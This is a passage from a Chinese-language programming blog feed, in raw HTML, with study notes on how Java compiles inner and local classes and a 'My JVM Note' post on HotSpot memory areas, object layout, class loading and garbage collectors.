JavaLangTest$InnerClass(JavaLangTest var1) &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.<span class="keyword">this</span>$<span class="number">0</span> = var1;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 其对应与以下代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InnerClass innerClass = <span class="keyword">new</span> JavaLangTest().new InnerClass();</span><br><span class="line">        System.out.println(innerClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InnerClass</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>内部类是一种编译器现象，与虚拟机无关。编译器将会把内部类翻译成用$(美元符号）分隔外部类名与内部类名的常规类文件，而虚拟机则对此一无所知</p></li><li><p>内部类可以访问外围类的私有数据——无论是否static。这是一个编译器现象，那么也就是实际上这个内部类并没有魔法加持，那么它是如何访问外部类的private数据的？外部类会合成一个类似于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> access$<span class="number">100</span>(JavaLangTest x0) &#123;</span><br><span class="line">    <span class="keyword">return</span> x0.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>的方法，然后内部类调用这个方法，传递<code>this$0</code>这种指向外部类的引用的参数，从而获得private的数据（如果是static内部类，那么并不需要传递参数就可以获取）。可以利用这个特性，在无关的地方，使用反射来调用这个方法从而获取该类的private数据</p></li><li><p>局部类的实现原理 </p><ul><li>这是反编译字节码得到的局部类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span>$1<span class="title">LocalClass</span> </span>&#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> InnerClass val$innerClass;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> <span class="keyword">int</span> val$a;</span><br><span class="line"></span><br><span class="line">   JavaLangTest$<span class="number">1L</span>ocalClass(InnerClass var1, <span class="keyword">int</span> var2) &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.val$innerClass = var1;</span><br><span class="line">      <span class="keyword">this</span>.val$a = var2;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">worker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="keyword">this</span>.val$innerClass);</span><br><span class="line">      System.out.println(<span class="keyword">this</span>.val$a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>这是原来的代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">InnerClass innerClass = <span class="keyword">new</span> JavaLangTest().new InnerClass();</span><br><span class="line">innerClass.worker();</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">worker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(innerClass);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">LocalClass localClass = <span class="keyword">new</span> LocalClass();</span><br><span class="line">localClass.worker();</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><h5 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h5><ul><li>既然我们已经知道内部类访问外部类的原理，那么内存可见性其实就和普通的类之间互相访问对方的数据没有差别。所以，如果一个变量没有final修饰或者没有volatile修饰或者没有加锁，那么就不能保证其对内部类是可见的，即使可见，也不能保证内部来看到的对象是完成构造之后的对象(这里有个问题，原子变量也是吗)</li><li>按照JCIP(java concurrent in practice)，一个对象的引用即使对于某个线程是可见的（比如某个对象发现这个引用非null了），这个对象的状态有可能还没初始化完成，也就是这个对象可能处于不一致状态</li><li>不过我在测试中，因为不能对该对象设置volatile，也不能搞个volatile的flag来标志这个对象是否已经完成初始化(因为JSR133保证，某个volatile变量被Thread a 写入后，Thread b去读这个变量，读了之后，原先在Thread a写入该变量之前对于Thread a可见的状态，对于Thread b都可见)，所以情况一直是读到该变量是null，即使另一个线程已经初始完成。所以没有复现出JCIP中提到的这种情况</li></ul><h5 id="局部类"><a href="#局部类" class="headerlink" title="局部类"></a>局部类</h5><ul><li>因为创建线程过程中，是先构造一个Runnable对象，然后在传递给Thread，也就是构造对象的过程是在原来线程中进行的，所以可以读到这个事实final变量的正确的值</li><li><p>这是手写的代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这是反编译得到的代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> misc.Test3.1;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">   Test3() &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">new</span> Thread(<span class="keyword">new</span> <span class="number">1</span>(a));</span><br><span class="line">      <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span>$1 <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> <span class="keyword">int</span> val$a;</span><br><span class="line"></span><br><span class="line">   Test3$<span class="number">1</span>(<span class="keyword">int</span> var1) &#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.val$a = var1;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="keyword">this</span>.val$a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>虽然lambda反汇编出来跟匿名内部类的代码不太一样，不过我认为也是同样的在同一个线程构造Runnable对象后再传递进去（欢迎指正！）</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;实现原理&quot;&gt;&lt;a href=&quot;#实现原理&quot; class=&quot;headerlink&quot; title=&quot;实现原理&quot;&gt;&lt;/a&gt;实现原理&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/j
      
    
    </summary>
    
      <category term="JAVA" scheme="https://h-zex.github.io/categories/JAVA/"/>
    
    
      <category term="java内部类" scheme="https://h-zex.github.io/tags/java%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="java局部类" scheme="https://h-zex.github.io/tags/java%E5%B1%80%E9%83%A8%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>My JVM Note</title>
    <link href="https://h-zex.github.io/2019/03/02/JVM-Note/"/>
    <id>https://h-zex.github.io/2019/03/02/JVM-Note/</id>
    <published>2019-03-02T04:49:04.000Z</published>
    <updated>2019-07-02T15:41:12.548Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本笔记大部分是《深入理解java虚拟机第二版》的笔记，该书基于java1.7</p></blockquote><h3 id="Override"><a href="#Override" class="headerlink" title="Override"></a>Override</h3><ul><li>准确式内存管理：即虚拟机可以知道内存中某个位置的数据具体是什么类型</li><li></li></ul><h3 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h3><ul><li><p>方法区</p><ul><li><p>线程共享</p></li><li><p>存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等</p></li><li><p>虚拟机规范把方法区描述为堆的一个逻辑部分（但是有一个别名：Non-Heap）</p></li><li><p>HotSpot用永久代实现。其他虚拟机并没有永久代这个概念</p><blockquote><p>但使用永久代来实现方法区，现在看来并不是一个好主意，因为这样更容易遇到内存溢出问题（永久代有<code>-XX:MaxPermSize</code>的上限，J9和JRockit只要没有触碰到进程可用内存的上限，例如32位系统中的4GB，就不会出现问题），而且有极少数方法（例如<code>String.intern()</code>）会因这个原因导致不同虚拟机下有不同的表现。</p></blockquote></li><li><p>规范要求，可以不需要连续的内存（连续的的物理内存？），可以固定大小或可扩展，可以不实现垃圾收集</p></li><li><p>有OutOfMemoryError异常</p></li></ul></li><li>运行时常量池<ul><li>方法区的一部分</li><li>class文件中的常量池在类加载后就放入这里</li><li>规范没有做细节要求。一般来说,除了保存Class文件中描述的符号引用外,还会把翻译出来的直接引用也存储在运行时常量池中</li><li>具有动态性。运行期可以把新的常量放进池中（比如<code>String.intern()</code>）</li></ul></li><li><p>直接内存</p><ul><li><p>不是虚拟机运行时数据区的一部分，也不是规范中定义的内存区域</p></li><li><p>NIO可以直接操作堆外的内存</p><blockquote><p>在JDK1.4中新加入了NIO（NewInput/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆中的DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。</p></blockquote></li><li><p>可能出现OOM异常</p></li><li><p>这里的内存溢出，明显的特征是HeapDum文件中不会看到明显的异常，并且可能Dump文件很小</p></li></ul></li><li>堆<ul><li>存放对象实例</li><li>垃圾收集器管理的主要区域</li><li>线程共享。虚拟机启动时创建</li><li>可以划分出多个线程私有的分配缓冲区</li><li>有OutOfMemoryError异常</li><li>规范要求，可以处于物理上不连续的内存空间，只要逻辑上连续即可。可以是可扩展或固定大小</li></ul></li><li>虚拟机栈<ul><li>线程私有。生命周期与线程相同</li><li>栈帧中有：局部变量表（方法运行期不会改变大小，存有基本数据类型、对象引用、returnAddress类型）、操作数栈、动态链接、方法出口等信息</li><li>方法调用对应于一个栈帧在虚拟机栈的入栈到出栈过程</li><li>有StackOverflowError异常、OutOfMemoryError异常（只有可以动态扩展虚拟机栈的虚拟机再有OOM异常）</li></ul></li><li>本地方法栈<ul><li>类似于虚拟机栈</li><li>线程私有、生命周期与线程相同</li><li>具体的虚拟机可以自由实现</li><li>有StackOverflowError和OutOfMemoryError异常</li><li>在HotSpot虚拟机中并不区分虚拟机栈和本地方法栈</li></ul></li><li>程序计数器<ul><li>线程私有、生命周期与线程相同</li><li>没有任何OutOfMemoryError情况</li></ul></li></ul><h3 id="HotSpot在Java堆中对象的创建、布局、访问"><a href="#HotSpot在Java堆中对象的创建、布局、访问" class="headerlink" title="HotSpot在Java堆中对象的创建、布局、访问"></a><strong>HotSpot</strong>在Java堆中对象的创建、布局、访问</h3><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><blockquote><p>以下仅限于普通对象，不包括数组和class对象</p></blockquote><ul><li>当遇到new指令时<ul><li>在常量池定位这个类的符号引用，并检查该类是否已被加载、解析和初始化过。如果没有要执行对应的加载过程</li><li>为新生对象分配内存（指针碰撞、空闲列表、TLAB）（在类加载后对象所需的内存便可完全确定）</li><li>把分配到的内存空间都初始为0值（如果是TLAB，可以提前到TLAB分配时进行）</li><li>设置对象头（哪个类的实例、如何找到类的元数据信息、对象的hashCode、对象的GC分代年龄等。根据是否启用偏向锁，对象头会有不同的设置方式）</li><li>截止以上，从虚拟机的角度看，新对象已经产生了</li><li>一般来说（由字节码中是否跟随invokespecial指令所决定），执行new指令之后会接着执行<code>&lt;init&gt;</code> 方法， 把对象按照程序员的意愿进行初始化， 这样一个真正可用的对象才算完全产生出来</li></ul></li></ul><h5 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h5><ul><li>对象在内存中的布局有：对象头、实例数据、对齐填充</li><li>对象头<ul><li>第一部分用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等</li><li>第二部分是类型指针，即指向类元数据的指针</li><li>如果是数组，还要有一块用于记录长度</li></ul></li><li>实例数据<ul><li>程序代码中所定义的各种类型的字段内容（包括从父类继承和子类中定义的）</li><li>存储顺序会受到虚拟机分配策略参数（FieldsAllocationStyle） 和字段在Java源码中定义顺序的影响</li><li>默认的分配策略是<ul><li>相同宽度字段被分配在一起<ul><li><code>longs/doubles</code></li><li><code>ints</code></li><li><code>shorts/chars</code></li><li><code>bytes/booleans</code></li><li><code>oops</code>(ordinary object pointers)（有个问题，指针不是64bit吗？）</li></ul></li><li>满足上面那个条件后，父类定义的出现在子类之前</li><li>如果CompactFields参数值为true（默认为true），那么子类之中较窄的变量也可能会插入到父类变量的空隙之中</li></ul></li></ul></li><li>padding<ul><li>由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，所以可能需要padding</li></ul></li></ul><h5 id="定位和访问"><a href="#定位和访问" class="headerlink" title="定位和访问"></a>定位和访问</h5><ul><li>HotSpot使用直接指针。另一种方式是句柄（不是HotSpot采用的）</li><li>句柄<ul><li>需要在java堆中有句柄池</li><li>句柄中包含对象的实例数据和类型数据的各自具体地址</li><li>在对象被移动时，无需更新reference数据</li></ul></li></ul><h3 id="类加载的时机"><a href="#类加载的时机" class="headerlink" title="类加载的时机"></a>类加载的时机</h3><blockquote><p>注意，这一部分JVM有明确规定，但不知道是否有一些是实现相关的。我试验时用的是HotSpot，openJDK 1.8，client模式下</p></blockquote><ul><li><p>按照作者说法</p><blockquote><p>常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化</p></blockquote><p>在实验中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InitTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Holder.str3);</span><br><span class="line">        <span class="comment">// 如果是输出str，则不会输出`Init Holder`</span></span><br><span class="line">        <span class="comment">// 如果是输出str2和str3则会</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Holder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String str = <span class="string">"Hello"</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String str2 = <span class="keyword">new</span> String(<span class="string">"NewString"</span>);</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String str3 = String.valueOf(<span class="string">"Str3"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Init Holder"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="HotSpot-VM的结构"><a href="#HotSpot-VM的结构" class="headerlink" title="HotSpot VM的结构"></a>HotSpot VM的结构</h3><ul><li>GC（可插拔）</li><li>JIT（可插拔）</li><li>runtime</li></ul><h3 id="HotSpot-Runtime"><a href="#HotSpot-Runtime" class="headerlink" title="HotSpot Runtime"></a>HotSpot Runtime</h3><h5 id="职责"><a href="#职责" class="headerlink" title="职责"></a>职责</h5><ul><li>parsing of command line arguments</li><li>VM life cycle</li><li>class loading,</li><li>byte code interpreter</li><li>exception handling</li><li>synchronization</li><li>thread management</li><li>Java Native Interface</li><li>VM fatal error handling</li><li>C++ (non-Java) heap management.</li></ul><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><ul><li>程序计数器、虚拟机栈、本地方法栈3个区域需要的内存<strong>基本上</strong>在类结构确定时就已知（JIT优化会有所改变），并且生命周期与线程、方法的进入退出相同，所以内存回收是确定的</li><li>java堆和方法区需要的内存则需要运行时才知道，分配回收都是动态的，所以需要GC</li><li>吞吐量=运行用户代码时间/(运行用户代码时间+垃圾收集时间)</li></ul><h5 id="GC的3件事"><a href="#GC的3件事" class="headerlink" title="GC的3件事"></a>GC的3件事</h5><ul><li>哪些内存需要回收？</li><li>什么时候回收？</li><li>如何回收？</li></ul><h5 id="可作为CG-Roots的对象"><a href="#可作为CG-Roots的对象" class="headerlink" title="可作为CG Roots的对象"></a>可作为CG Roots的对象</h5><ul><li>虚拟机栈（栈帧中的本地变量表） 中引用的对象</li><li>方法区中类静态属性引用的对象</li><li>方法区中常量引用的对象</li><li>本地方法栈中JNI（即一般说的Native方法） 引用的对象</li></ul><h5 id="强、软、弱、虚引用"><a href="#强、软、弱、虚引用" class="headerlink" title="强、软、弱、虚引用"></a>强、软、弱、虚引用</h5><ul><li>强引用：只要还存在，GC永远不会回收被引用对象</li><li>软引用：对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收。如果这次回收还没有足够的内存，才会抛出内存溢出异常</li><li>弱引用：被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象</li><li>虚引用：也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知</li></ul><h5 id="Hotspot-GC"><a href="#Hotspot-GC" class="headerlink" title="Hotspot GC"></a>Hotspot GC</h5><ul><li><p>Minor GC：新生代的GC，Eden空间的存活对象和from survivor空间的不够老的存活对象复制到to survivor空间，from survivor空间中足够老的对象提升为老年代。结束后，Eden空间一般是全空的（也有不空的情况）。只要追求速度，空间利用率会低一些</p></li><li><p>Major GC（Full GC）：老年代GC, Major GC经常会伴随至少一次的Minor GC（但非绝对的， 在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程） 。 Major GC的速度一般会比Minor GC慢10倍以上</p><blockquote><p><em>java performance</em> HotSpot中译本P57注释有</p><p>“实际上，HotSpot VM的FullGC收集整个堆，包括新生代、老年代、永生代”</p></blockquote></li><li><p>过早提升：Minor GC时，to survivor空间不足，所以多余对象移到老年代</p></li><li><p>提升失败：Minor GC过程中，老年代满了，所以需要Full GC（这需要遍历整个java堆）</p></li><li><p>大对象可能直接分配到老年代</p></li></ul><h6 id="各种GC"><a href="#各种GC" class="headerlink" title="各种GC"></a>各种GC</h6><ul><li><p>Serial</p><ul><li>单线程Stop-The-World式收集器</li><li>新生代使用复制收集算法（如同上面MinorGC那里描述的那样）</li><li>可以与CMS配合</li><li>应用场景<ul><li>如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial就很好。</li><li>client模式下新生代的默认收集器（jdk7时？）</li></ul></li></ul></li><li><p>Serial Old</p><ul><li><p>单线程Stop-The-World式收集器</p></li><li><p>Serial的老年代版本</p></li><li><p>使用标记清除压缩收集算法，回收时找出所有的存活对象，然后滑动到堆的头部</p></li><li><p>应用场景</p><ul><li><p>如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial Old就很好。</p></li><li><p>主要给Client模式下的虚拟机用</p></li><li><p>在Server模式下,那么它主要还有两大用途</p><ul><li><p>一种用途是在JDK 1.5以及之前的版本中与Parallel Scavenge收集器搭配使用</p><blockquote><p>Parallel Scavenge收集器架构中本身有PS MarkSweep收集器来进行老年代收集,并非直接使用了Serial Old收集器,但是这个PS MarkSweep收集器与Serial Old的实现非常接近,所以在官方的许多资料中都是直接以Serial Old代替PS MarkSweep进行讲解</p></blockquote></li><li><p>另一种用途就是作为CMS收集器的后备预案,在并发收集发生Concurrent Mode Failure时使用</p></li></ul></li></ul></li></ul></li><li><p>ParNew:</p><ul><li>Serial的多线程版本（除了多线程，与Serial差别没有差别）</li><li>新生代的收集器</li><li>可以与CMS配合</li><li>应用场景<ul><li>运行于Server模式下的首选新生代收集器（jdk7时？），因为除了serial，只有它能与CMS配合</li></ul></li></ul></li><li><p>Parallel Scavenge</p><ul><li>又叫吞吐量优先处理器</li><li>新生代的收集器</li><li>多线程Stop-The-World式收集器，采用复制收集算法</li><li>Parallel Scavenge收集器的目标则是达到一个可控制的吞吐量</li><li>不能与CMS配合</li><li>自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别</li><li>Parallel Scavenge收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码</li><li><code>-XX:MaxGCPauseMillis</code>：参数设置最大垃圾收收集停顿时间。GC停顿时间缩短是以牺牲吞吐量和新生代空间来换取的，设得过小可能导致频繁GC</li><li><code>-XX:GCTimeRatio</code>：设置吞吐量，为大于0小于100的整数，设为$x$的含义是GC时间占$\frac{1}{x+1}$，默认是99</li><li><code>-XX:+UseAdaptiveSizePolicy</code>：打开后，就不需要手工指定新生代的大小(-Xmn)、Eden与Survivor区的比例、晋升老年代对象年龄等细节参数了</li></ul></li><li><p>Parallel Old</p><ul><li>Parallel Scavenge收集器的老年代版本</li><li>使用多线程和“标记-整理”算法</li><li>这个收集器是在JDK 1.6中才开始提供的，以前只能让Parallel Scavenge与Serial Old配合</li><li>在注重吞吐量以及CPU资源敏感的场合,都可以优先考虑Parallel Scavenge加Parallel Old收集器</li></ul></li><li><p>CMS(Concurrent Mark Sweep)</p><ul><li><p>老年代的收集器</p></li><li><p>以获取最短回收停顿时间为目标的收集器</p></li><li><p>使用多线程、标记-清除算法</p></li><li><p>它第一次实现了让垃圾收集线程与用户线程(基本上)同时工作</p></li><li><p>尽可能并发、低停顿式的收集器，独立于HotSpot分代式GC框架另行实现的并行收集器</p></li><li><p>整个过程分为四个步骤：初始标记、并发标记、重新标记、并发清除</p><blockquote><p>初始标记、重新标记这两个步骤仍然需要“Stop The World”。初始标记仅仅只是标记一下GC Roots能直接关联到的对象,速度很快,并发标记阶段就是进行GC RootsTracing的过程,而重新标记阶段则是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录,这个阶段的停顿时间一般会比初始标记阶段稍长一些,但远比并发标记的时间短。由于整个过程中耗时最长的并发标记和并发清除过程收集器线程都可以与用户线程一起工作</p></blockquote></li><li><p>缺点</p><ul><li><p>对CPU资源敏感（默认启动的回收线程是$(\text{CPU数量}+3)/4$）</p></li><li><p>由于在垃圾收集阶段用户线程还需要运行，所以无法处理浮动垃圾，可能出现<code>Concurrent Mode Failure</code>失败而导致另一次FullGC</p><blockquote><p>要是CMS运行期间预留的内存无法满足程序需要,就会出现一次<code>Concurrent Mode Failure</code>失败,这时虚拟机将启动后备预案:临时启用Serial Old收集器来重新进行老年代的垃圾收集,这样停顿时间就很长了</p></blockquote></li><li><p>由于在垃圾收集阶段用户线程还需要运行,那也就还需要预留有足够的内存空间给用户线程使用,因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集,需要预留一部分空间提供并发收集时的程序运作使用（可以通过<code>XX:CMSInitiatingOccupancyFraction</code>调高触发百分比，不过如果过高，就会出现<code>Concurrent Mode Failure</code>）</p></li><li><p>基于标记-清除算法，所以会有大量空间碎片，导致可能提前触发FullGC</p><blockquote><ul><li>为了解决这个问题,CMS收集器提供了一个<code>XX:+UseCMSCompactAtFullCollection</code>开关参数(默认就是开启的),用于在CMS收集器顶不住要进行FullGC时开启内存碎片的合并整理过程,内存整理的过程是无法并发的,空间碎片问题没有了,但停顿时间不得不变长</li><li>虚拟机设计者还提供了另外一个参数<code>-XX:CMSFullGCsBeforeCompaction</code>,这个参数是用于设置执行多少次不压缩的Full GC后,跟着来一次带压缩的(默认值为0,表示每次进入Full GC时都进行碎片整理)。</li></ul></blockquote></li></ul></li></ul></li><li><p>G1</p><ul><li>G1收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码</li><li>面向服务端</li></ul></li></ul><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><blockquote><p>在实际情况中， 每个Class文件都有可能代表着Java语言中的一个类或接口， 后文中直接对“类”的描述都包括了类和接口的可能性</p></blockquote><h5 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h5><ul><li>在Java语言里面，类型的加载、 连接和初始化过程都是在程序运行期间完成的， 这种策略虽然会令类加载时稍微增加一些性能开销， 但是会为Java应用程序提供高度的灵活性，例如在运行时才指定某个接口的实现类</li><li>验证、准备、解析三个部分统称为连接</li></ul><h5 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h5><ul><li>加载（loading）</li><li>验证</li><li>准备</li><li>解析</li><li>初始化</li><li>使用</li><li>卸载</li></ul><h5 id="ClassLoader例子"><a href="#ClassLoader例子" class="headerlink" title="ClassLoader例子"></a>ClassLoader例子</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 